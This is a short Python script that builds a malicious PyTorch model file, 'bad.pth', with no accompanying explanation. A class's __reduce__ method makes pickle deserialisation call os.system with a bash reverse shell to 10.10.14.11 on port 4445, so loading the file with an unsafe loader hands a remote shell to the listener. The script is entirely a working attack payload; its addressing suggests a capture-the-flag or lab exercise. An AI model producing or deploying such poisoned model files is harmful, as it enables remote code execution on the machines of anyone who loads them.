import os
import torch

class RevShell():
    def __reduce__(self):
        return (os.system, ("bash -c 'bash -i >& /dev/tcp/10.10.14.11/4445 0>&1'",))
    

torch.save(RevShell(), 'bad.pth')